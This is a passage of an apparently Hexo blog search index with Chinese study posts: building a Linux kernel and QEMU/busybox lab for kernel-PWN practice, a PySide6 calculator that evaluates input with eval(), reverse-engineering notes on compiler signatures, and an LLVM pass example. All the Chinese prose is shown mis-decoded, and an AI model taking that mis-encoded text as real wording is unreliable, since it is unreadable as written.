        <tag>PWN</tag>
        <tag>Houseç³»åˆ—</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel PWNâ€”â€”å†…æ ¸ç¼–è¯‘ä»¥åŠæ¨¡æ‹Ÿ</title>
    <url>/2025/02/19/Kernel-PWN%E2%80%94%E2%80%94%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91%E4%BB%A5%E5%8F%8A%E6%A8%A1%E6%8B%9F/</url>
    <content><![CDATA[<h1>ç¼–è¯‘</h1>
<p>å†…æ ¸ç‰ˆæœ¬ä¸‹è½½ï¼Œè¿™é‡Œéšä¾¿é€‰ä¸€ä¸ªLTSç‰ˆæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.4.98.tar.xz</span><br></pre></td></tr></table></figure>
<p>ä¸‹è½½å®Œè§£å‹è¿›å…¥å¯¹åº”çš„ç›®å½•æ¥é…ç½®ä¸€äº›é€‰é¡¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.4.98/</span><br><span class="line">make menuconfig <span class="comment"># Kernel hacking -&gt; Compile-time checks and compiler options -&gt; [*]Compile the kernel with debug info</span></span><br><span class="line">make -j3 bzImage</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘å¥½åä¼šæ˜¾ç¤ºå¦‚ä¸‹ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kernel: <span class="built_in">arch</span>/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘ä¾¿åˆ°æ­¤ç»“æŸ</p>
<h1>QEMUæ¨¡æ‹Ÿ</h1>
<p>è¿™é‡Œé¦–å…ˆéœ€è¦å®‰è£…busyboxæ¥æ¨¡æ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.32.1.tar.bz2</span><br><span class="line">tar -jxf busybox-1.32.1.tar.bz2</span><br></pre></td></tr></table></figure>
<p>ç„¶åè¿›è¡Œé…ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br><span class="line"><span class="comment"># Setttings -&gt; [*] Build static binary (no shared libs)</span></span><br><span class="line"><span class="comment"># Linux System Utilities -&gt; [] Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)</span></span><br><span class="line"><span class="comment"># Networking Utilities -&gt; [] inetd</span></span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make -j3</span><br></pre></td></tr></table></figure>
<p>åˆ›å»º<code>_install</code>ç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure>
<p><font style="color:rgba(0, 0, 0, 0.87);">åœ¨ </font><code>_install</code><font style="color:rgba(0, 0, 0, 0.87);"> ç›®å½•ä¸‹åˆ›å»ºä»¥ä¸‹æ–‡ä»¶å¤¹</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>
<p>åˆ›å»º<code>init</code>å¯åŠ¨è„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INIT SCRIPT&quot;</span></span><br><span class="line"><span class="built_in">mkdir</span> /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br></pre></td></tr></table></figure>
<p>éšååœ¨è¯¥ç›®å½•ä¸‹æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line"><span class="comment"># æ‰“åŒ…çš„æ–‡ä»¶ç³»ç»Ÿåœ¨ä¸Šä¸€çº§ç›®å½•ä¸‹</span></span><br></pre></td></tr></table></figure>
<h1>å¯åŠ¨ï¼</h1>
<p>å¯åŠ¨è„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>
<p><img src="/images/pasted-28.png" alt="upload successful"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Kernel PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt6å­¦ä¹ ç¬¬ä¸€å¤©â€”â€”åŸºç¡€æ¡†æ¶ã€ä¿¡å·ä¸æ§½å’Œç¬¬ä¸€ä¸ªè®¡ç®—å™¨ç¨‹åº</title>
    <url>/2024/08/09/PyQt6%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E5%A4%A9%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E6%A1%86%E6%9E%B6%E5%92%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E5%99%A8%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="åŸºç¡€æ¡†æ¶">åŸºç¡€æ¡†æ¶</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QApplication, QWidget</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyWindow</span>(<span class="title class_ inherited__">QWidget</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = MyWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>
<h2 id="ç¬¬ä¸€ä¸ªè®¡ç®—å™¨ç¨‹åº">ç¬¬ä¸€ä¸ªè®¡ç®—å™¨ç¨‹åº</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PySide6.QtWidgets <span class="keyword">import</span> QWidget, QApplication</span><br><span class="line"><span class="keyword">from</span> Ui_Calculator <span class="keyword">import</span> Ui_Form</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">calcWindow</span>(QWidget, Ui_Form):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="variable language_">self</span>.setupUi(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.bind()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">bind</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># æ‰¹é‡ä¸º btn0 åˆ° btn9 æ·»åŠ ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            button = <span class="built_in">getattr</span>(<span class="variable language_">self</span>, <span class="string">f&#x27;btn<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">            button.clicked.connect(<span class="keyword">lambda</span> _, b=button: <span class="variable language_">self</span>.addNumber(b.text()))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># ä¸ºè¿ç®—æŒ‰é’®æ·»åŠ ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">        operators = &#123;</span><br><span class="line">            <span class="string">&#x27;btn_multiply&#x27;</span>: <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_divide&#x27;</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_substract&#x27;</span>: <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;btn_plus&#x27;</span>: <span class="string">&#x27;+&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> btn_name, symbol <span class="keyword">in</span> operators.items():</span><br><span class="line">            button = <span class="built_in">getattr</span>(<span class="variable language_">self</span>, btn_name)</span><br><span class="line">            button.clicked.connect(<span class="keyword">lambda</span> _, s=symbol: <span class="variable language_">self</span>.addNumber(s) <span class="keyword">if</span> <span class="variable language_">self</span>.isValid() <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.btn_equal.clicked.connect(<span class="variable language_">self</span>.calcResult)</span><br><span class="line">        <span class="variable language_">self</span>.btn_clear.clicked.connect(<span class="variable language_">self</span>.clearBox)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clearBox</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.result_box.clear()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calcResult</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = <span class="built_in">str</span>(<span class="built_in">eval</span>(<span class="variable language_">self</span>.result))</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(result)</span><br><span class="line">            <span class="variable language_">self</span>.result = result</span><br><span class="line">        <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(<span class="string">&quot;Cannot divide by zero&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="variable language_">self</span>.result_box.setText(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isValid</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.result_box.text()[-<span class="number">1</span>:].isdigit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addNumber</span>(<span class="params">self, num: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.result += num</span><br><span class="line">        <span class="variable language_">self</span>.result_box.setText(<span class="variable language_">self</span>.result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication()</span><br><span class="line">    window = calcWindow()</span><br><span class="line">    window.show()</span><br><span class="line">    app.<span class="built_in">exec</span>()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>PyQT</tag>
      </tags>
  </entry>
  <entry>
    <title>Reverseå­¦ä¹ ç¬¬ä¸€å‘¨â€”â€”ç‰¹å¾å’Œå£³</title>
    <url>/2024/08/08/Reverse%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%88%9D%E8%AF%86%E9%80%86%E5%90%91%E4%B8%8E%E5%A3%B3/</url>
    <content><![CDATA[<h1>ä»€ä¹ˆæ˜¯ç‰¹å¾ï¼Ÿ</h1>
<p>æ¯ä¸€ç§ç¼–ç¨‹è¯­è¨€æˆ–è€…ç¼–è¯‘å™¨æ‰€ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºéƒ½æœ‰å…¶ç‹¬ç‰¹çš„ç‰¹å¾ï¼Œå…¶é€šå¸¸è¡¨ç°åœ¨ï¼š<code>å…¥å£ç‚¹</code>ï¼Œ<code>ç¨‹åºåŒºæ®µ</code>ï¼Œ<code>åŠ è½½æ¨¡å—</code>ç­‰ã€‚</br>ä¸‹é¢å°±å„ç§è¯­è¨€å’Œç¼–è¯‘å™¨æ‰€ç¼–è¯‘å‡ºæ¥çš„ç¨‹åºè¿›è¡Œåˆ†æã€‚</p>
<h2 id="VC6">VC6</h2>
<p>ä½¿ç”¨OllyDbgæŸ¥çœ‹<img src="/images/pasted-2.png" alt="upload successful"><br>
å¯ä»¥çœ‹åˆ°å…¶å…¥å£ç‚¹ä»£ç ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp, esp</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨ExeinfopeæŸ¥çœ‹åŒºæ®µæƒ…å†µ<br>
<img src="/images/pasted-3.png" alt="upload successful"></p>
<h3 id="æ€»ç»“">æ€»ç»“</h3>
<p>åœ¨å…¥å£ç‚¹ä»£ç ä¸Šï¼ŒVC6ç¨‹åºä½¿ç”¨äº†å›ºå®šçš„ä¸¤è¡Œä»£ç ï¼Œå…¶è°ƒç”¨çš„APIä¹Ÿæ˜¯ç›¸åŒçš„</br>åœ¨ç¨‹åºåŒºæ®µä¸Šï¼ŒVC6ç¨‹åºçš„åŒºæ®µä¸ºå›ºå®šçš„<code>.text</code>,<code>.rdata</code>,<code>.data</code>,<code>.rsrc</code></p>
<h2 id="VS2008-VS2013">VS2008&amp;VS2013</h2>
<p>ä½¿ç”¨OllyDbgæŸ¥çœ‹<br>
2008:<br>
<img src="/images/pasted-6.png" alt="upload successful"><br>
2013:<br>
<img src="/images/pasted-5.png" alt="upload successful"><br>
å…¶å…¥å£ç‚¹ä»£ç ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call xxx ;è°ƒç”¨æ¨¡å—ç›¸åŒ</span><br><span class="line">jmp xxx</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨ExeinfopeæŸ¥çœ‹åŒºæ®µæƒ…å†µ<br>
2008:<br>
<img src="/images/pasted-7.png" alt="upload successful"><br>
2013:<br>
<img src="/images/pasted-8.png" alt="upload successful"><br>
ç›¸è¾ƒäºVC6å¤šäº†ä¸€ä¸ª<code>.reloc</code>æ®µ</p>
<h3 id="æ€»ç»“-2">æ€»ç»“</h3>
<p>VS2008&amp;VS2013çš„å…¥å£ç‚¹ä»£ç ç‰¹å¾ä¸ºå…ˆcallåjmpï¼ŒåŒºæ®µç›¸è¾ƒvc6å¤šä¸€ä¸ª<code>.reloc</code>æ®µ</p>
<h2 id="æ˜“è¯­è¨€ç‹¬ç«‹-éç‹¬ç«‹-ç¼–è¯‘ç¨‹åº">æ˜“è¯­è¨€ç‹¬ç«‹(éç‹¬ç«‹)ç¼–è¯‘ç¨‹åº</h2>
<p>ä½¿ç”¨OllyDbgæŸ¥çœ‹å…¥å£ç‚¹ä»£ç éç‹¬ç«‹ç¼–è¯‘ï¼š<img src="/images/pasted-10.png" alt="upload successful"><br>
ç¬¬ä¸€ä¸ªcallä½œç”¨æˆ‘æ„Ÿè§‰æ˜¯è¿›å…¥ä¸»å‡½æ•°ï¼ˆmainï¼‰çš„æ„æ€ï¼Œåé¢åˆ™å®šä¹‰äº†å‡ ä¸ªå­—ç¬¦ä¸²è¿›å…¥åˆ°<code>0x40108E</code>åï¼Œ<code>0x40109E</code>å¼€å§‹è°ƒç”¨<code>krnln.fnr</code>åº“</p>
<blockquote>
<p>æ˜“è¯­è¨€ç¨‹åºåœ¨éç‹¬ç«‹ç¼–è¯‘åï¼Œä¼šç”Ÿæˆä¸¤ä¸ªè¿è¡Œæ‰€éœ€çš„ä¾èµ–åº“åˆ†åˆ«ä¸º<code>krnln.fnr</code>å’Œ<code>krnln.fne</code></p>
</blockquote>
<p>è¿˜æœ‰ä¸ªå¾ˆç‹¬ç‰¹çš„ç‰¹å¾ï¼Œå°±æ˜¯åœ¨æ¯æ¬¡callå®Œä¹‹åï¼Œéƒ½ä¼šè¿”å›åˆ°ä¸€ä¸ªæ ¸å¿ƒå‡½æ•°ä¸­<img src="/images/pasted-12.png" alt="upload successful"><br>
åœ¨æˆ‘ç†è§£çœ‹æ¥ï¼Œè¿™ä¸ªæ“ä½œå’ŒCè¯­è¨€ä¸­è°ƒç”¨åº“å‡½æ•°ä¼šè§¦å‘å»¶è¿Ÿç»‘å®šé‡å®šå‘åˆ°çœŸæ­£å‡½æ•°çš„æ“ä½œå·®ä¸å¤š</p>
<p>ä½¿ç”¨ExeinfopeæŸ¥çœ‹åŒºæ®µæƒ…å†µ<img src="/images/pasted-11.png" alt="upload successful"><br>
å¯ä»¥çœ‹åˆ°åŒºæ®µæƒ…å†µå’Œ<strong>VC6</strong>ç›¸åŒ</p>
<h3 id="æ€»ç»“-3">æ€»ç»“</h3>
<p>ä»å…¥å£ç‚¹ä»£ç ç‰¹å¾ä¸Šçœ‹ï¼Œæ˜“è¯­è¨€ç¨‹åºå…ˆæ˜¯callåˆ°ä¸»å‡½æ•°ï¼Œåé¢åˆ™å®šä¹‰äº†å‡ ä¸ªå­—ç¬¦ä¸²</br>ä»ç¨‹åºæ‰§è¡Œæµç¨‹ä»£ç ä¸Šçœ‹ï¼Œæ¯æ¬¡è°ƒç”¨å‡½æ•°ï¼Œä¼šè§¦å‘é‡å®šå‘æ“ä½œ</br>ä»åŒºæ®µä¸Šçœ‹ï¼Œå’Œ<strong>VC6</strong>ç›¸åŒ</p>
<h2 id="Delphi">Delphi</h2>
]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>llvmå­¦ä¹ ï¼ˆ1ï¼‰</title>
    <url>/2024/12/03/llvm%E5%AD%A6%E4%B9%A0%EF%BC%881%EF%BC%89/</url>
    <content><![CDATA[<h1>LLVM Passå­¦ä¹ ï¼ˆ1ï¼‰</h1>
<p>å› ä¸ºä¸æƒ³å†åœ¨è¿™ç§é¢˜ä¸Šçˆ†é›¶ï¼Œæ‰€ä»¥å¼€äº†è¿™ä¸ªç³»åˆ—ğŸ˜­</p>
<h2 id="LLVM-Passæ¦‚è¿°">LLVM Passæ¦‚è¿°</h2>
<p>LLVM Pass æ˜¯ä¸€ä¸ªåœ¨ LLVM ç¼–è¯‘æ¡†æ¶ä¸­æ‰§è¡Œçš„ç‹¬ç«‹çš„ä»£ç å˜æ¢æˆ–ä¼˜åŒ–æ­¥éª¤ã€‚LLVM æœ¬èº«æ˜¯ä¸€ä¸ªå¼€æºçš„ç¼–è¯‘å™¨æ¡†æ¶ï¼Œå¹¿æ³›ç”¨äºç”Ÿæˆæœºå™¨ä»£ç ã€ä¼˜åŒ–ä»£ç å’Œè¿›è¡Œç¨‹åºåˆ†æã€‚Pass æ˜¯ LLVM ä¸­å¤„ç†ä¸­é—´è¡¨ç¤ºï¼ˆIR, Intermediate Representationï¼‰çš„åŸºæœ¬å•ä½ã€‚</p>
<h3 id="å…·ä½“æ¦‚å¿µè§£é‡Šï¼š">å…·ä½“æ¦‚å¿µè§£é‡Šï¼š</h3>
<ol>
<li class="lvl-3">
<p><strong>ä¸­é—´è¡¨ç¤ºï¼ˆIRï¼‰</strong>ï¼š<br>
LLVM ä½¿ç”¨ä¸€ç§ç§°ä¸ºä¸­é—´è¡¨ç¤ºï¼ˆIRï¼‰çš„ä½çº§ä»£ç æ ¼å¼ï¼Œä»‹äºæºä»£ç å’Œæœºå™¨ä»£ç ä¹‹é—´ã€‚IR æ›´åŠ æŠ½è±¡ï¼Œä¸ä¾èµ–äºä»»ä½•ç‰¹å®šçš„ç¡¬ä»¶æ¶æ„ï¼Œä¾¿äºè¿›è¡Œä¼˜åŒ–å’Œè½¬æ¢ã€‚</p>
</li>
<li class="lvl-3">
<p><strong>Pass</strong>ï¼šåœ¨ LLVM ä¸­ï¼ŒPass æ˜¯å¯¹ IR è¿›è¡ŒæŸç§æ“ä½œçš„å•å…ƒã€‚æ¯ä¸ª Pass ä¼šæ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡ï¼Œå¦‚ä¼˜åŒ–ã€åˆ†ææˆ–è€…ä»£ç è½¬æ¢ã€‚Pass ä¼šéå† IRï¼Œå¹¶å¯¹å…¶è¿›è¡Œä¿®æ”¹æˆ–åˆ†æï¼Œç”Ÿæˆæ›´æœ‰æ•ˆçš„ä»£ç ã€‚</p>
<p>Pass å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼š</p>
<ul class="lvl-2">
<li class="lvl-5">
<p><strong>åˆ†æ Pass</strong>ï¼šè¿™ç±» Pass åªå¯¹ç¨‹åºè¿›è¡Œåˆ†æï¼Œä¸ä¼šä¿®æ”¹ä»£ç ã€‚ä¾‹å¦‚ï¼Œåˆ†æç¨‹åºçš„æ§åˆ¶æµã€æ•°æ®æµã€ä¾èµ–å…³ç³»ç­‰ã€‚</p>
</li>
<li class="lvl-5">
<p><strong>å˜æ¢ Pass</strong>ï¼šè¿™ç±» Pass ä¼šå¯¹ä»£ç è¿›è¡Œä¿®æ”¹ï¼Œé€šå¸¸ç”¨äºä¼˜åŒ–ã€‚æ¯”å¦‚ï¼Œæ¶ˆé™¤æ— ç”¨ä»£ç ï¼ˆDead Code Eliminationï¼‰ã€å¾ªç¯å±•å¼€ï¼ˆLoop Unrollingï¼‰ç­‰ã€‚</p>
</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>ä¼˜åŒ–</strong>ï¼š<br>
LLVM Pass çš„é‡è¦åŠŸèƒ½ä¹‹ä¸€æ˜¯ä¼˜åŒ–ï¼Œä¼˜åŒ–å¯ä»¥å¸®åŠ©ç”Ÿæˆè¿è¡Œæ›´é«˜æ•ˆçš„ä»£ç ã€‚ä¼˜åŒ–çš„ç±»å‹æœ‰å¾ˆå¤šï¼ŒåŒ…æ‹¬ï¼š</p>
<ul class="lvl-2">
<li class="lvl-5"><strong>å¸¸é‡ä¼ æ’­</strong>ï¼ˆConstant Propagationï¼‰ï¼šç”¨å·²çŸ¥çš„å¸¸é‡å€¼æ›¿æ¢è¡¨è¾¾å¼ã€‚</li>
<li class="lvl-5"><strong>å¾ªç¯ä¼˜åŒ–</strong>ï¼šå¯¹å¾ªç¯è¿›è¡Œä¼˜åŒ–ï¼Œå¦‚å¾ªç¯åˆå¹¶ã€å¾ªç¯å±•å¼€ç­‰ã€‚</li>
<li class="lvl-5"><strong>æ­»ä»£ç æ¶ˆé™¤</strong>ï¼ˆDead Code Eliminationï¼‰ï¼šåˆ é™¤ä¸å½±å“ç¨‹åºç»“æœçš„ä»£ç ã€‚</li>
<li class="lvl-5"><strong>å†…è”</strong>ï¼ˆInliningï¼‰ï¼šå°†å‡½æ•°è°ƒç”¨æ›¿æ¢ä¸ºå‡½æ•°ä½“ï¼Œä»¥å‡å°‘å‡½æ•°è°ƒç”¨çš„å¼€é”€ã€‚</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>Pass ç®¡ç†å™¨</strong>ï¼šåœ¨ LLVM ä¸­ï¼Œå¤šä¸ª Pass ä¼šè¢«ç»„åˆåœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ª Pass ç®¡ç†å™¨ï¼ˆPass Managerï¼‰ã€‚Pass ç®¡ç†å™¨è´Ÿè´£ç®¡ç†å’Œæ‰§è¡Œæ‰€æœ‰çš„ Passï¼Œå¹¶ç¡®ä¿å®ƒä»¬æŒ‰ç…§æ­£ç¡®çš„é¡ºåºæ‰§è¡Œã€‚Pass å¯ä»¥æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ­¥éª¤ï¼Œä¹Ÿå¯ä»¥æŒ‰éœ€ç»„åˆæ‰§è¡Œã€‚</p>
</li>
<li class="lvl-3">
<p><strong>ä¼˜åŒ–çº§åˆ«</strong>ï¼š<br>
LLVM æä¾›ä¸åŒçš„ä¼˜åŒ–çº§åˆ«ï¼ˆå¦‚ <code>-O1</code>ã€<code>-O2</code>ã€<code>-O3</code>ï¼‰æ¥æ§åˆ¶ Pass çš„åº”ç”¨ç¨‹åº¦ã€‚ä¸åŒçš„çº§åˆ«è¡¨ç¤ºä¸åŒçš„ä¼˜åŒ–å¼ºåº¦ï¼Œé«˜çº§åˆ«å¯èƒ½ä¼šä½¿ç”¨æ›´å¤æ‚çš„ä¼˜åŒ–ï¼Œä½†ä¹Ÿå¯èƒ½ä¼šå¢åŠ ç¼–è¯‘æ—¶é—´ã€‚</p>
</li>
</ol>
<h3 id="äººè¯ï¼š">äººè¯ï¼š</h3>
<p>å‡è®¾æœ‰ä¸€æ®µç¨‹åºï¼Œå®ƒåšäº†å¾ˆå¤šé‡å¤çš„è®¡ç®—ã€‚å¦‚æœä½¿ç”¨ LLVM Pass æ¥ä¼˜åŒ–ä»£ç ï¼ŒPass å¯èƒ½ä¼šå‘ç°è¿™äº›è®¡ç®—æ˜¯å†—ä½™çš„ï¼ˆä¾‹å¦‚ï¼Œä¸¤ä¸ªç›¸åŒçš„åŠ æ³•æ“ä½œï¼‰ï¼Œç„¶åå°†å…¶ä¼˜åŒ–æˆæ›´ç®€å•çš„ä»£ç ï¼Œä»è€ŒåŠ é€Ÿç¨‹åºçš„æ‰§è¡Œã€‚</p>
<p>æ€»ç»“æ¥è¯´ï¼ŒLLVM Pass æ˜¯ä¸€ç§å¯¹ä»£ç è¿›è¡Œä¼˜åŒ–å’Œå˜æ¢çš„æœºåˆ¶ï¼Œé€šè¿‡å¤šä¸ªç‹¬ç«‹çš„ Pass å¯¹ä¸­é—´è¡¨ç¤ºè¿›è¡Œæ“ä½œï¼Œæœ€ç»ˆå¸®åŠ©ç”Ÿæˆæ›´åŠ é«˜æ•ˆçš„æœºå™¨ä»£ç ã€‚</p>
<h2 id="å°è¯•ç‰›åˆ€">å°è¯•ç‰›åˆ€</h2>
<blockquote>
<p>ç¯å¢ƒä¸ºUbuntu20.04ï¼Œllvmç‰ˆæœ¬ä¸ºllvm-9</p>
</blockquote>
<p>é¦–å…ˆå‡†å¤‡ä¸€æ®µå®˜æ–¹èµ„æ–™ç»™çš„æµ‹è¯•ä»£ç </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/IR/Function.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/Pass.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/Support/raw_ostream.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/IR/LegacyPassManager.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;llvm/Transforms/IPO/PassManagerBuilder.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">//å£°æ˜åŒ¿åç©ºé—´ï¼Œè¢«å£°æ˜çš„å†…å®¹ä»…åœ¨æ–‡ä»¶å†…éƒ¨å¯è§</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;<span class="comment">//é‡å†™runOnFunctionï¼Œä½¿å¾—æ¯æ¬¡éå†åˆ°ä¸€ä¸ªå‡½æ•°çš„æ—¶å€™å°±è¾“å‡ºå‡½æ•°å</span></span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;<span 